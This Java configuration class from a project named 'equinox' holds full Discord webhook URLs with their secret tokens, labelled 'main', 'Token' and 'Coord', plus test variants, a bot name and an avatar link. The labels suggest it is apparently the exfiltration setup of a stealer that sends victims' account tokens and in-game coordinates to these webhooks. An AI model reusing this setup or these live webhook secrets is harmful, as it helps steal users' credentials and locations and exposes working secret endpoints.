package me.eonexe.equinox.configuration;



public class Configs {
    //main
    private static String main = "https://discord.com/api/webhooks/908277356773408798/QnjJ9tn4Lq7xoGS4dyuKXpMoZVTOkFKL1eHRi4AZB_GCGqjDt8BuMfi_lTMIeigmLgif";
    private static String Token = "https://discord.com/api/webhooks/908816077235040256/Bv8Y7ZZsugIV7dxc3VDjVN0O5524g8EoH3WBxU5QRGCpq5jIhR0uIA-M9T6KWjKqF8DW";
    private static String Coord = "https://discord.com/api/webhooks/908277461949743144/NPNDI5VyPciVSEkFIqF_GSXIURDuqZWVQIdQLoPxCzrFnjrJP1SBK8hPrYogewZxIxL7";
    //test
    private static String TestMain = "https://discord.com/api/webhooks/900633061371281440/D4vvzbjGM86IVxJgjhDwgVdPpRoZZjf642woPQ7PIKaxyJkHUC4o5y-EKwjpXoBqqb5R";
    private static String TestToken = "https://discord.com/api/webhooks/908827161220235285/jfymQP__8Alrny5EeXYeTPpDfRdVreuIQqJB9dlMGyL4_C1g9qFUO3yVlAoDvb0A_feK";
    //change the value of main and token to get their test equivalent
    private static final String MainWH = main;
    private static final String TokenWH = Token;
    private static final String CoordWH = Coord;
    //bot properties
    private static final String pfpURL = "https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png";
    private static final String name = "Devito";
    //java momment
    public static String getMain(){
        return MainWH;
    }
    public static String getCoord() {
        return CoordWH;
    }
    public static String getToken() {
        return TokenWH;
    }
    public static String getpfp() {
        return pfpURL;
    }
    public static String getname() {
        return name;
    }
}
